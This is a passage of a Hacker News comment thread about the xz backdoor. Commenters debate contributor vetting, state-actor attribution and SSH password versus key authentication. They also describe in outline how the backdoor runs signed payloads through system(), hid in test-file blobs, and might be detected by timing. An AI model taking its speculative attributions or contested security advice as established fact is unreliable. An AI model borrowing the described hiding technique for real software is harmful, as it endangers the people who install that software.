for="c-39881419">[-]</label><label class="expand" for="c-39881419">[1 more]</label></div><br/><div class="children"><div class="content">&gt; yo dawg curl this shit and pipe it to sh so you can RCE while you bike shed someone’s unsafe block<p>Ahhh this takes me back to... a month ago...[0]<p>At least rust wraps function in main so you won&#x27;t run a partial command, but still doesn&#x27;t there aren&#x27;t other dangers. I&#x27;m more surprised by how adamant people are about that there&#x27;s no problem. You can see elsewhere in the thread that piping man still could (who knows!) pose a risk. Extra especially when you consider how trivial the fix is, especially when people are just copy pasting the command anyways...<p>It never ceases to amaze me how resistant people are to very easily solvable problems.<p>[0] <a href="https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=39556047">https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=39556047</a></div><br/></div></div></div></div><div id="39880985" class="c"><input type="checkbox" id="c-39880985" checked=""/><div class="controls bullet"><span class="by">fredamaral</span><span>|</span><a href="#39880433">parent</a><span>|</span><a href="#39881348">prev</a><span>|</span><a href="#39880792">next</a><span>|</span><label class="collapse" for="c-39880985">[-]</label><label class="expand" for="c-39880985">[10 more]</label></div><br/><div class="children"><div class="content">dont you think that something as simple as a CLA (contributor legal agreement) would prevent this type of thing? of course creates noise in the open source contribution funnel, but let&#x27;s be honest: if you are dedicating yourself to something like contributing to oss, signing a CLA should not be something unrealistic.</div><br/><div id="39881004" class="c"><input type="checkbox" id="c-39881004" checked=""/><div class="controls bullet"><span class="by">omeid2</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880985">parent</a><span>|</span><a href="#39881063">next</a><span>|</span><label class="collapse" for="c-39881004">[-]</label><label class="expand" for="c-39881004">[4 more]</label></div><br/><div class="children"><div class="content">CLA is not an ID check. It is to handover the rights for the code over to the project owners rather than doing any identity check.</div><br/><div id="39881052" class="c"><input type="checkbox" id="c-39881052" checked=""/><div class="controls bullet"><span class="by">fredamaral</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881004">parent</a><span>|</span><a href="#39881063">next</a><span>|</span><label class="collapse" for="c-39881052">[-]</label><label class="expand" for="c-39881052">[3 more]</label></div><br/><div class="children"><div class="content">agreed. but it does not mean i couldn&#x27;t be. as per the terms, the content of a CLA could be anything. and that&#x27;s my point</div><br/><div id="39882135" class="c"><input type="checkbox" id="c-39882135" checked=""/><div class="controls bullet"><span class="by">omeid2</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881052">parent</a><span>|</span><a href="#39881078">next</a><span>|</span><label class="collapse" for="c-39882135">[-]</label><label class="expand" for="c-39882135">[1 more]</label></div><br/><div class="children"><div class="content">Then the question becomes &quot;should we require ID for open source contributions?&quot; and the answer is most likely no, not a good idea.</div><br/></div></div><div id="39881078" class="c"><input type="checkbox" id="c-39881078" checked=""/><div class="controls bullet"><span class="by">creatonez</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881052">parent</a><span>|</span><a href="#39882135">prev</a><span>|</span><a href="#39881063">next</a><span>|</span><label class="collapse" for="c-39881078">[-]</label><label class="expand" for="c-39881078">[1 more]</label></div><br/><div class="children"><div class="content">That&#x27;s stretching the traditional definition. Usually CLAs are solely focused on addressing the copyright conditions and intellectual property origin of the contributed changes. Maybe just &quot;contributor agreement&quot; or &quot;contributor contract&quot; would describe that.</div><br/></div></div></div></div></div></div><div id="39881063" class="c"><input type="checkbox" id="c-39881063" checked=""/><div class="controls bullet"><span class="by">tw04</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880985">parent</a><span>|</span><a href="#39881004">prev</a><span>|</span><a href="#39880792">next</a><span>|</span><label class="collapse" for="c-39881063">[-]</label><label class="expand" for="c-39881063">[5 more]</label></div><br/><div class="children"><div class="content">What exactly is a CLA going to do to a CCP operative (as appears to be the case with xz)?  Do you think the party is going to extradite one of their state sponsored hacking groups because they got caught trying to implement a backdoor?<p>Or do you think they don’t have the resources to fake an identity?</div><br/><div id="39881431" class="c"><input type="checkbox" id="c-39881431" checked=""/><div class="controls bullet"><span class="by">Muromec</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881063">parent</a><span>|</span><a href="#39881076">next</a><span>|</span><label class="collapse" for="c-39881431">[-]</label><label class="expand" for="c-39881431">[2 more]</label></div><br/><div class="children"><div class="content">The whole Chinese name and UTC+8 were a cover, as the person apparently was from EET</div><br/><div id="39882114" class="c"><input type="checkbox" id="c-39882114" checked=""/><div class="controls bullet"><span class="by">tw04</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881431">parent</a><span>|</span><a href="#39881076">next</a><span>|</span><label class="collapse" for="c-39882114">[-]</label><label class="expand" for="c-39882114">[1 more]</label></div><br/><div class="children"><div class="content">While it ultimately doesn’t matter if it was Russia or China beyond potential political fallout.  Do you have a link to the proof pointing towards EET?</div><br/></div></div></div></div><div id="39881076" class="c"><input type="checkbox" id="c-39881076" checked=""/><div class="controls bullet"><span class="by">fredamaral</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881063">parent</a><span>|</span><a href="#39881431">prev</a><span>|</span><a href="#39880792">next</a><span>|</span><label class="collapse" for="c-39881076">[-]</label><label class="expand" for="c-39881076">[2 more]</label></div><br/><div class="children"><div class="content">case closed. you are right... could of course make the things a bit more difficult for someone not backed by a state sponsor. but if that&#x27;s the case, you are right.</div><br/><div id="39881101" class="c"><input type="checkbox" id="c-39881101" checked=""/><div class="controls bullet"><span class="by">tw04</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881076">parent</a><span>|</span><a href="#39880792">next</a><span>|</span><label class="collapse" for="c-39881101">[-]</label><label class="expand" for="c-39881101">[1 more]</label></div><br/><div class="children"><div class="content">Sadly the only way to even have a chance of fighting this is to insist on new contributors being vetted in person, and even that won’t be fool-proof.<p>It’s also not scalable and likely won’t ever happen, but it’s the only solution I can come up with.</div><br/></div></div></div></div></div></div></div></div></div></div><div id="39877698" class="c"><input type="checkbox" id="c-39877698" checked=""/><div class="controls bullet"><span class="by">jtchang</span><span>|</span><a href="#39880433">prev</a><span>|</span><a href="#39882432">next</a><span>|</span><label class="collapse" for="c-39877698">[-]</label><label class="expand" for="c-39877698">[31 more]</label></div><br/><div class="children"><div class="content">So this basically means to scan for this exploit remotely we&#x27;d need the private key of the attacker which we don&#x27;t have. Only other option is to run detection scripts locally. Yikes.</div><br/><div id="39877824" class="c"><input type="checkbox" id="c-39877824" checked=""/><div class="controls bullet"><span class="by">tialaramex</span><span>|</span><a href="#39877698">parent</a><span>|</span><a href="#39877997">next</a><span>|</span><label class="collapse" for="c-39877824">[-]</label><label class="expand" for="c-39877824">[24 more]</label></div><br/><div class="children"><div class="content">One completely awful thing some scanners might choose to do is if you&#x27;re offering RSA auth (which most SSH servers are and indeed the SecSH RFC says this is Mandatory To Implement) then you&#x27;re &quot;potentially vulnerable&quot; which would encourage people to do password auth instead.<p>Unless we find that this problem has somehow infested a <i>lot</i> of real world systems that seems to me even worse than the time similar &quot;experts&quot; decided that it was best to demand people rotate their passwords every year or so thereby ensuring the real security is reduced while on paper you claim you improved it.</div><br/><div id="39879623" class="c"><input type="checkbox" id="c-39879623" checked=""/><div class="controls bullet"><span class="by">danparsonson</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39877824">parent</a><span>|</span><a href="#39877997">next</a><span>|</span><label class="collapse" for="c-39879623">[-]</label><label class="expand" for="c-39879623">[23 more]</label></div><br/><div class="children"><div class="content">Have to admit I&#x27;ve never understood why password auth is considered so much worse than using a cert - surely a decent password (long, random, etc) is for all practical purposes unguessable, and so you&#x27;re either using a private RSA key that no-one can guess, or a password that no-one can guess, and then what&#x27;s the difference? With the added inconvenience of having to pass around a certificate if you want to login to the same account from from multiple sources.</div><br/><div id="39879800" class="c"><input type="checkbox" id="c-39879800" checked=""/><div class="controls bullet"><span class="by">teraflop</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39879623">parent</a><span>|</span><a href="#39882309">next</a><span>|</span><label class="collapse" for="c-39879800">[-]</label><label class="expand" for="c-39879800">[6 more]</label></div><br/><div class="children"><div class="content">One of the biggest differences is that if you&#x27;re using password auth, and you are tricked into connecting to a malicious server, that server now has your <i>plaintext</i> password and can impersonate you to other servers.<p>If you use a <i>different</i> strong random password for every single server, this attack isn&#x27;t a problem, but that adds a lot of management hassle compared to using a single private key. (It&#x27;s also made more difficult by host key checking, but let&#x27;s be honest, most of us don&#x27;t diligently check the fingerprints every single time we get a mismatch warning.)<p>In contrast, if you use an SSH key, then a compromised server never actually gets a copy of your private key unless you explicitly copy it over. (If you&#x27;re have SSH agent forwarding turned on, then <i>during</i> the compromised connection, the server can run a &quot;confused deputy&quot; attack to authenticate other connections using your agent&#x27;s identity. But it loses that ability when you disconnect.)</div><br/><div id="39882098" class="c"><input type="checkbox" id="c-39882098" checked=""/><div class="controls bullet"><span class="by">droopyEyelids</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39879800">parent</a><span>|</span><a href="#39881620">next</a><span>|</span><label class="collapse" for="c-39882098">[-]</label><label class="expand" for="c-39882098">[2 more]</label></div><br/><div class="children"><div class="content">Not a rhetorical question: couldn&#x27;t the malicious server relay the challenge from a valid server for to you to sign, and impersonate you that way?</div><br/><div id="39882198" class="c"><input type="checkbox" id="c-39882198" checked=""/><div class="controls bullet"><span class="by">kortilla</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39882098">parent</a><span>|</span><a href="#39881620">next</a><span>|</span><label class="collapse" for="c-39882198">[-]</label><label class="expand" for="c-39882198">[1 more]</label></div><br/><div class="children"><div class="content">No, these schemes use the pub&#x2F;private keys to setup symmetric crypto, so just passing it along does you no good because what follows is a bunch of stuff encrypted by a session key only the endpoints know.<p>If I am a server and have your public key in an authorized_keys file, I can just encrypt a random session key using that and only you will be able to decrypt it to finish setting up the session.<p>This is why passwords and asymmetric crypto are worlds apart in security guarantees.</div><br/></div></div></div></div><div id="39881620" class="c"><input type="checkbox" id="c-39881620" checked=""/><div class="controls bullet"><span class="by">someplaceguy</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39879800">parent</a><span>|</span><a href="#39882098">prev</a><span>|</span><a href="#39882309">next</a><span>|</span><label class="collapse" for="c-39881620">[-]</label><label class="expand" for="c-39881620">[3 more]</label></div><br/><div class="children"><div class="content">&gt; if you&#x27;re using password auth, and you are tricked into connecting to a malicious server, that server now has your plaintext password and can impersonate you to other servers.<p>Why would the password be sent in plaintext instead of, say, sending a hash of the password calculated with a salt that is unique per SSH server? Or something even more cryptographically sound.<p>In fact, passwords in &#x2F;etc&#x2F;shadow already do have random salts, so why aren&#x27;t these sent over to the SSH client so it can send a proper hash instead of the plaintext password?</div><br/><div id="39881836" class="c"><input type="checkbox" id="c-39881836" checked=""/><div class="controls bullet"><span class="by">danparsonson</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39881620">parent</a><span>|</span><a href="#39882309">next</a><span>|</span><label class="collapse" for="c-39881836">[-]</label><label class="expand" for="c-39881836">[2 more]</label></div><br/><div class="children"><div class="content">If the hash permits a login then having a hash is essentially equivalent to having a password. The malicious user wouldn&#x27;t be able to use it to sudo but they could deploy some other privilege escalation once logged in.</div><br/></div></div></div></div></div></div><div id="39882309" class="c"><input type="checkbox" id="c-39882309" checked=""/><div class="controls bullet"><span class="by">bostik</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39879623">parent</a><span>|</span><a href="#39879800">prev</a><span>|</span><a href="#39879933">next</a><span>|</span><label class="collapse" for="c-39882309">[-]</label><label class="expand" for="c-39882309">[1 more]</label></div><br/><div class="children"><div class="content">&gt; <i>surely a decent password (long, random, etc) is for all practical purposes unguessable</i><p>Sadly that is not how normies use passwords. <i>WE</i> know what passwords managers are for. Vast majority of people outside our confined sphere do not.<p>In short: password rotation policies make passwords overall less secure, because in order to remember what the new password is, people apply patterns. Patterns are guessable. Patterns get applied to <i>future password as well</i>. This has been known to the infosec people since 1990&#x27;s because they had to understand how people actually behave. It took a research paper[0], <i>published in 2010</i>, to finally provide sufficient data for that fact to become undeniable.<p>It still took another 6-7 years until the information percolated through to the relevant regulatory bodies and for them to update their previous guidance. These days both NIST and NCSC tell in very clear terms to <i>not</i> require password rotation.<p>0: <a href="https:&#x2F;&#x2F;www.researchgate.net&#x2F;publication&#x2F;221517955_The_true_cost_of_unusable_password_policies" rel="nofollow">https:&#x2F;&#x2F;www.researchgate.net&#x2F;publication&#x2F;221517955_The_true_...</a></div><br/></div></div><div id="39879933" class="c"><input type="checkbox" id="c-39879933" checked=""/><div class="controls bullet"><span class="by">duskwuff</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39879623">parent</a><span>|</span><a href="#39882309">prev</a><span>|</span><a href="#39882008">next</a><span>|</span><label class="collapse" for="c-39879933">[-]</label><label class="expand" for="c-39879933">[1 more]</label></div><br/><div class="children"><div class="content">&gt; Have to admit I&#x27;ve never understood why password auth is considered so much worse than using a cert<p>Password auth involves sending your credentials to the server. They&#x27;re encrypted, but not irreversibly; the server <i>needs</i> your plaintext username and password to validate them, and it can, in principle, record them to be reused elsewhere.<p>Public key and certificate-based authentication only pass your username and a signature to the server. Even if you don&#x27;t trust the server you&#x27;re logging into, it can&#x27;t do anything to compromise other servers that key has access to.</div><br/></div></div><div id="39882008" class="c"><input type="checkbox" id="c-39882008" checked=""/><div class="controls bullet"><span class="by">Too</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39879623">parent</a><span>|</span><a href="#39879933">prev</a><span>|</span><a href="#39879864">next</a><span>|</span><label class="collapse" for="c-39882008">[-]</label><label class="expand" for="c-39882008">[1 more]</label></div><br/><div class="children"><div class="content">A lot of it has to do with centralizing administration. If you have more than one server and more than one user, certificates reduce a NxM problem into N+M instead.<p>Certificates can be revoked, they can have short expiry dates and due to centralized administration, renewing them is not terribly inconvenient.<p>On top of that they are a lot more difficult to read over the shoulder, to some degree that can be considered the second factor in a MFA scheme.  Same reasons why passkeys are preferred over passwords lately. Not as secure as a HW-key, still miles better than “hunter2”.</div><br/></div></div><div id="39879864" class="c"><input type="checkbox" id="c-39879864" checked=""/><div class="controls bullet"><span class="by">dboreham</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39879623">parent</a><span>|</span><a href="#39882008">prev</a><span>|</span><a href="#39880204">next</a><span>|</span><label class="collapse" for="c-39879864">[-]</label><label class="expand" for="c-39879864">[8 more]</label></div><br/><div class="children"><div class="content">It depends what happens to the password. Typically it&#x27;s sent as a bearer credential. But there are auth schemes (not widely used these days) where the password isn&#x27;t sent over the wire.</div><br/><div id="39879947" class="c"><input type="checkbox" id="c-39879947" checked=""/><div class="controls bullet"><span class="by">solardev</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39879864">parent</a><span>|</span><a href="#39880204">next</a><span>|</span><label class="collapse" for="c-39879947">[-]</label><label class="expand" for="c-39879947">[7 more]</label></div><br/><div class="children"><div class="content">Isn&#x27;t it pretty standard practice to salt and hash the password client-side before sending it over the wire?</div><br/><div id="39880721" class="c"><input type="checkbox" id="c-39880721" checked=""/><div class="controls bullet"><span class="by">cayde</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39879947">parent</a><span>|</span><a href="#39880204">next</a><span>|</span><label class="collapse" for="c-39880721">[-]</label><label class="expand" for="c-39880721">[6 more]</label></div><br/><div class="children"><div class="content">No, usually it&#x27;s sent in plain text to the server, however encapsulated.</div><br/><div id="39881314" class="c"><input type="checkbox" id="c-39881314" checked=""/><div class="controls bullet"><span class="by">solardev</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39880721">parent</a><span>|</span><a href="#39880204">next</a><span>|</span><label class="collapse" for="c-39881314">[-]</label><label class="expand" for="c-39881314">[5 more]</label></div><br/><div class="children"><div class="content">Wow, really? Ten years ago, it was drilled into me to never send a password like that, especially since the server shouldn&#x27;t have the plain version anyway (so no reason for the client to send it).<p><a href="https:&#x2F;&#x2F;owasp.org&#x2F;www-community&#x2F;OWASP_Application_Security_FAQ" rel="nofollow">https:&#x2F;&#x2F;owasp.org&#x2F;www-community&#x2F;OWASP_Application_Security_F...</a> says &quot;Salted hash for transmitting passwords is a good technique. This ensures that the password can not be stolen even if the SSL key is broken.&quot;<p>I didn&#x27;t want to believe you, but man, I just checked a few websites in the network inspector... and it seems like GMail, Hackernews, Wordpress, Wix, and Live.com all just sent it in plaintext with only SSL encryption :(<p>That&#x27;s a bit disappointing. But TIL. Thanks for letting me know!</div><br/><div id="39882216" class="c"><input type="checkbox" id="c-39882216" checked=""/><div class="controls bullet"><span class="by">kortilla</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39881314">parent</a><span>|</span><a href="#39881897">next</a><span>|</span><label class="collapse" for="c-39882216">[-]</label><label class="expand" for="c-39882216">[1 more]</label></div><br/><div class="children"><div class="content">It doesn’t actually do anything because if SSL is compromised then all of the junk you think you are telling the client to do to the password is via JavaScript that is also compromised.<p>If you’re worried about passive listeners with ssl private keys, perfect forward secrecy at the crypto layer solved that a long time ago.<p>For browsers at least, sending passwords plainly over a tls session is as good as it gets.</div><br/></div></div><div id="39881897" class="c"><input type="checkbox" id="c-39881897" checked=""/><div class="controls bullet"><span class="by">hwaccel</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39881314">parent</a><span>|</span><a href="#39882216">prev</a><span>|</span><a href="#39881396">next</a><span>|</span><label class="collapse" for="c-39881897">[-]</label><label class="expand" for="c-39881897">[1 more]</label></div><br/><div class="children"><div class="content">&gt; Salted hash for transmitting passwords is a good technique. This ensures that the password can not be stolen even if the SSL key is broken<p>I&#x27;m a little confused with this recommendation<p>How server is supposed to verify user&#x27;s password in this case? Store the same hash with exactly the same salt in the database, effectively making the transmitted salted hash a cleartext password?</div><br/></div></div><div id="39881396" class="c"><input type="checkbox" id="c-39881396" checked=""/><div class="controls bullet"><span class="by">cayde</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39881314">parent</a><span>|</span><a href="#39881897">prev</a><span>|</span><a href="#39881537">next</a><span>|</span><label class="collapse" for="c-39881396">[-]</label><label class="expand" for="c-39881396">[1 more]</label></div><br/><div class="children"><div class="content">If you want to hop into a rabbit hole, try taking look in Steam&#x27;s  login send the user and pass))<p>If TLS break then all is untrusted anyway! If you read hash as MITM you can replay it as pass equivalent and log in with hash, do not need knowledge of the original pass. You can just inject the script to exfilatrate original pass before hashing. CSP is broken, since you can edit header to give your own script a inline nonce. I think everything is reliant on TLS in end.<p>I think 10yr ago before TLS was 99%+ standard on all sites many people would come up with schemes, forums would md5 pass client side and send md5, all sorts were common. But now trust is in TLS.</div><br/></div></div><div id="39881537" class="c"><input type="checkbox" id="c-39881537" checked=""/><div class="controls bullet"><span class="by">jbverschoor</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39881314">parent</a><span>|</span><a href="#39881396">prev</a><span>|</span><a href="#39880204">next</a><span>|</span><label class="collapse" for="c-39881537">[-]</label><label class="expand" for="c-39881537">[1 more]</label></div><br/><div class="children"><div class="content">That&#x27;s exactly the case with HTTP credentials and most authentication frameworks...</div><br/></div></div></div></div></div></div></div></div></div></div><div id="39880204" class="c"><input type="checkbox" id="c-39880204" checked=""/><div class="controls bullet"><span class="by">imrehg</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39879623">parent</a><span>|</span><a href="#39879864">prev</a><span>|</span><a href="#39879791">next</a><span>|</span><label class="collapse" for="c-39880204">[-]</label><label class="expand" for="c-39880204">[2 more]</label></div><br/><div class="children"><div class="content">On that last point, I wouldn&#x27;t pass around the certificate to log in from multiple sources, rather each source would have its own certificate. That is easy &amp; cheap to do (especially with ed25519 certs).</div><br/><div id="39881851" class="c"><input type="checkbox" id="c-39881851" checked=""/><div class="controls bullet"><span class="by">danparsonson</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39880204">parent</a><span>|</span><a href="#39879791">next</a><span>|</span><label class="collapse" for="c-39881851">[-]</label><label class="expand" for="c-39881851">[1 more]</label></div><br/><div class="children"><div class="content">Ah right, that&#x27;s useful, thanks. Presumably if you need to login from an untrusted source (e.g. in an emergency), then you&#x27;re out of luck in that case? Do you maybe keep an emergency access cert stashed somewhere?</div><br/></div></div></div></div><div id="39879791" class="c"><input type="checkbox" id="c-39879791" checked=""/><div class="controls bullet"><span class="by">denysvitali</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39879623">parent</a><span>|</span><a href="#39880204">prev</a><span>|</span><a href="#39881461">next</a><span>|</span><label class="collapse" for="c-39879791">[-]</label><label class="expand" for="c-39879791">[1 more]</label></div><br/><div class="children"><div class="content">The difference, IMHO, is that it&#x27;s easier to pick an easy guessable password than it is to create an insecure RSA key (on purpose).</div><br/></div></div><div id="39881461" class="c"><input type="checkbox" id="c-39881461" checked=""/><div class="controls bullet"><span class="by">computerfriend</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39879623">parent</a><span>|</span><a href="#39879791">prev</a><span>|</span><a href="#39877997">next</a><span>|</span><label class="collapse" for="c-39881461">[-]</label><label class="expand" for="c-39881461">[2 more]</label></div><br/><div class="children"><div class="content">I sometimes ask this as an interview question. Hardly anybody knows the answer.</div><br/><div id="39881831" class="c"><input type="checkbox" id="c-39881831" checked=""/><div class="controls bullet"><span class="by">sureglymop</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39881461">parent</a><span>|</span><a href="#39877997">next</a><span>|</span><label class="collapse" for="c-39881831">[-]</label><label class="expand" for="c-39881831">[1 more]</label></div><br/><div class="children"><div class="content">So don&#x27;t you want to enlighten us with the answer?</div><br/></div></div></div></div></div></div></div></div><div id="39877997" class="c"><input type="checkbox" id="c-39877997" checked=""/><div class="controls bullet"><span class="by">CodesInChaos</span><span>|</span><a href="#39877698">parent</a><span>|</span><a href="#39877824">prev</a><span>|</span><a href="#39878357">next</a><span>|</span><label class="collapse" for="c-39877997">[-]</label><label class="expand" for="c-39877997">[4 more]</label></div><br/><div class="children"><div class="content">It might be possible to use timing information to detect this, since the signature verification code appears to only run if the client public key matches a specific fingerprint.<p>The backdoor&#x27;s signature verification should cost around 100us, so keys matching the fingerprint should take that much longer to process than keys that do not match it. Detecting this timing difference should at least be realistic over LAN, perhaps even over the internet, especially if the scanner runs from a location close to the target. Systems that ban the client&#x27;s IP after repeated authentication failures will probably be harder to scan.<p>(<a href="https:&#x2F;&#x2F;bench.cr.yp.to&#x2F;results-sign.html" rel="nofollow">https:&#x2F;&#x2F;bench.cr.yp.to&#x2F;results-sign.html</a> lists Ed448 verification at around 400k cycles, which at 4GHz amounts to 100us)</div><br/><div id="39878386" class="c"><input type="checkbox" id="c-39878386" checked=""/><div class="controls bullet"><span class="by">Thorrez</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39877997">parent</a><span>|</span><a href="#39878122">next</a><span>|</span><label class="collapse" for="c-39878386">[-]</label><label class="expand" for="c-39878386">[2 more]</label></div><br/><div class="children"><div class="content">According to[1], the backdoor introduces a much larger slowdown, without backdoor: 0m0.299s, with backdoor: 0m0.807s. I&#x27;m not sure exactly why the slowdown is so large.<p>[1] <a href="https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2024&#x2F;03&#x2F;29&#x2F;4" rel="nofollow">https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2024&#x2F;03&#x2F;29&#x2F;4</a></div><br/><div id="39878642" class="c"><input type="checkbox" id="c-39878642" checked=""/><div class="controls bullet"><span class="by">CodesInChaos</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39878386">parent</a><span>|</span><a href="#39878122">next</a><span>|</span><label class="collapse" for="c-39878642">[-]</label><label class="expand" for="c-39878642">[1 more]</label></div><br/><div class="children"><div class="content">The effect of the slowdown on the total handshake time wouldn&#x27;t work well for detection, since without a baseline you can&#x27;t tell if it&#x27;s slow due to the backdoor, or due to high network latency or a slow&#x2F;busy CPU. The relative timing of different steps in the TCP and SSH handshakes on the other hand should work, since the backdoor should only affect one&#x2F;some steps (RSA verification), while others remain unaffected (e.g. the TCP handshake).</div><br/></div></div></div></div><div id="39878122" class="c"><input type="checkbox" id="c-39878122" checked=""/><div class="controls bullet"><span class="by">pstrateman</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39877997">parent</a><span>|</span><a href="#39878386">prev</a><span>|</span><a href="#39878357">next</a><span>|</span><label class="collapse" for="c-39878122">[-]</label><label class="expand" for="c-39878122">[1 more]</label></div><br/><div class="children"><div class="content">However only probabilistic detection is possible that way and really 100us variance over the internet would require many many detection attempts to discern.</div><br/></div></div></div></div><div id="39878357" class="c"><input type="checkbox" id="c-39878357" checked=""/><div class="controls bullet"><span class="by">Thorrez</span><span>|</span><a href="#39877698">parent</a><span>|</span><a href="#39877997">prev</a><span>|</span><a href="#39882432">next</a><span>|</span><label class="collapse" for="c-39878357">[-]</label><label class="expand" for="c-39878357">[2 more]</label></div><br/><div class="children"><div class="content">The tweet says &quot;unreplayable&quot;. Can someone explain how it&#x27;s not replayable? Does the backdoored sshd issue some challenge that the attacker is required to sign?</div><br/><div id="39878463" class="c"><input type="checkbox" id="c-39878463" checked=""/><div class="controls bullet"><span class="by">candiodari</span><span>|</span><a href="#39877698">root</a><span>|</span><a href="#39878357">parent</a><span>|</span><a href="#39882432">next</a><span>|</span><label class="collapse" for="c-39878463">[-]</label><label class="expand" for="c-39878463">[1 more]</label></div><br/><div class="children"><div class="content">What it does is this: RSA_public_decrypt verifies a signature on the client&#x27;s (I think) host key by a fixed Ed448 key, and then if it verifies, passes the payload to system().<p>If you send a request to SSH to associate (agree on a key for private communications), signed by a specific private key, it will send the rest of the request to the &quot;system&quot; call in libc, which will execute it in bash.<p>So this is quite literally a &quot;shellcode&quot;. Except, you know, it&#x27;s on your system.</div><br/></div></div></div></div></div></div><div id="39882432" class="c"><input type="checkbox" id="c-39882432" checked=""/><div class="controls bullet"><span class="by">kzrdude</span><span>|</span><a href="#39877698">prev</a><span>|</span><a href="#39878188">next</a><span>|</span><label class="collapse" for="c-39882432">[-]</label><label class="expand" for="c-39882432">[1 more]</label></div><br/><div class="children"><div class="content">It&#x27;s weird now that &quot;it&#x27;s right there in the open&quot;,<p>Listed among the most recent commits there is &quot;update two test files&quot; <a href="https:&#x2F;&#x2F;git.tukaani.org&#x2F;?p=xz.git;a=commitdiff;h=6e636819e8f070330d835fce46289a3ff72a7b89" rel="nofollow">https:&#x2F;&#x2F;git.tukaani.org&#x2F;?p=xz.git;a=commitdiff;h=6e636819e8f...</a><p>And it&#x27;s kind of smart to attack a compression library - you have plausible deniability for these opaque binary blobs - they are supposedly test cases, but in reality encode parts of the backdoor.</div><br/></div></div><div id="39878188" class="c"><input type="checkbox" id="c-39878188" checked=""/><div class="controls bullet"><span class="by">jmward01</span><span>|</span><a href="#39882432">prev</a><span>|</span><a href="#39879487">next</a><span>|</span><label class="collapse" for="c-39878188">[-]</label><label class="expand" for="c-39878188">[76 more]</label></div><br/><div class="children"><div class="content">Where is the law enforcement angle on this? This individual&#x2F;organization needs to be on the top of every country&#x27;s most wanted lists.</div><br/><div id="39879043" class="c"><input type="checkbox" id="c-39879043" checked=""/><div class="controls bullet"><span class="by">bawolff</span><span>|</span><a href="#39878188">parent</a><span>|</span><a href="#39878886">next</a><span>|</span><label class="collapse" for="c-39879043">[-]</label><label class="expand" for="c-39879043">[1 more]</label></div><br/><div class="children"><div class="content">Its been all of 24 hours, these things take time. Presumably someone doing an attack this audacious took steps to cover their tracks and is using a fake name.</div><br/></div></div><div id="39878886" class="c"><input type="checkbox" id="c-39878886" checked=""/><div class="controls bullet"><span class="by">1oooqooq</span><span>|</span><a href="#39878188">parent</a><span>|</span><a href="#39879043">prev</a><span>|</span><a href="#39879340">next</a><span>|</span><label class="collapse" for="c-39878886">[-]</label><label class="expand" for="c-39878886">[4 more]</label></div><br/><div class="children"><div class="content">easy there. calling the cops on the NSA might be treason or something</div><br/><div id="39879586" class="c"><input type="checkbox" id="c-39879586" checked=""/><div class="controls bullet"><span class="by">BlueFalconHD</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878886">parent</a><span>|</span><a href="#39879843">next</a><span>|</span><label class="collapse" for="c-39879586">[-]</label><label class="expand" for="c-39879586">[1 more]</label></div><br/><div class="children"><div class="content">Like that spiderman meme, it&#x27;s all the NSA</div><br/></div></div><div id="39879843" class="c"><input type="checkbox" id="c-39879843" checked=""/><div class="controls bullet"><span class="by">concordDance</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878886">parent</a><span>|</span><a href="#39879586">prev</a><span>|</span><a href="#39879340">next</a><span>|</span><label class="collapse" for="c-39879843">[-]</label><label class="expand" for="c-39879843">[2 more]</label></div><br/><div class="children"><div class="content">I would have thought NSA would have hardware&#x2F;firmware backdoor everywhere and wouldn&#x27;t need this.</div><br/><div id="39880040" class="c"><input type="checkbox" id="c-39880040" checked=""/><div class="controls bullet"><span class="by">redox99</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879843">parent</a><span>|</span><a href="#39879340">next</a><span>|</span><label class="collapse" for="c-39880040">[-]</label><label class="expand" for="c-39880040">[1 more]</label></div><br/><div class="children"><div class="content">Probably not for fully Chinese hardware. Although this backdoor is only x86 so it still wouldn&#x27;t work there.</div><br/></div></div></div></div></div></div><div id="39879340" class="c"><input type="checkbox" id="c-39879340" checked=""/><div class="controls bullet"><span class="by">pcthrowaway</span><span>|</span><a href="#39878188">parent</a><span>|</span><a href="#39878886">prev</a><span>|</span><a href="#39879220">next</a><span>|</span><label class="collapse" for="c-39879340">[-]</label><label class="expand" for="c-39879340">[9 more]</label></div><br/><div class="children"><div class="content">Based on the level of sophistication being alluded to, I&#x27;m personally inclined to assume this is a state actor, possible even some arm of the U.S. 